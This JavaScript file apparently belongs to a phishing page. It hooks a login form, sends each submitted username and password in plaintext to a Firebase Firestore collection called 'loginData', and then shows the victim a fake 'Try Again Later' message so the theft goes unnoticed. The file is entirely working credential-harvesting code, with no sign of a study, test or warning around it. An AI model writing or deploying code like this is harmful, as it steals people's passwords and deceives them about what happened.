// Firebase Configuration (Use your Firebase project details)
const firebaseConfig = {
  apiKey: "your-api-key", // Replace with your Firebase API key
  authDomain: "txtfiles-5159a.firebaseapp.com", // Use your Firebase project ID
  projectId: "txtfiles-5159a", // Your Firebase Project ID
  storageBucket: "txtfiles-5159a.appspot.com", // Storage bucket name
  messagingSenderId: "306292367700", // Your Firebase messaging sender ID
  appId: "your-app-id" // Replace with your Firebase app ID
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Initialize Firestore
const db = firebase.firestore();

// Listen for form submit
document.getElementById("loginForm").addEventListener("submit", function (event) {
  event.preventDefault(); // Prevent page refresh

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // Add data to Firestore
  db.collection("loginData")
    .add({
      username: username,
      password: password,
      timestamp: firebase.firestore.FieldValue.serverTimestamp(),
    })
    .then(() => {
      alert("Try Again Later");
    })
    .catch((error) => {
      console.error("Error saving data: ", error);
      alert("Error saving data.");
    });
});